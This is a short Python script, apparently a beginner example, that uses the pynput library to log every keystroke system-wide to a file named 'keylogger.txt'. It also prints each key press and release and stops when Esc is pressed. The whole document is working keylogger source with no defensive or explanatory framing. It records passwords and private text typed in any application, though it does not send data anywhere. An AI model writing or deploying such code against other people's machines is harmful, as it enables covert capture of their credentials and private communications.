"using pynput"
import pynput
from pynput.keyboard import Key,Listener

keys=[]
def press(key):
    keys.append(key)
    with open('keylogger.txt','w') as f:
        for key in keys:
            f.write(str(key))
            f.write(' ')
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))
def release(key):
    print('{0}released'.format(key))
    if key == Key.esc:
        return False # stop listening
    
with Listener(on_press=press, on_release=release) as listener:
    listener. join()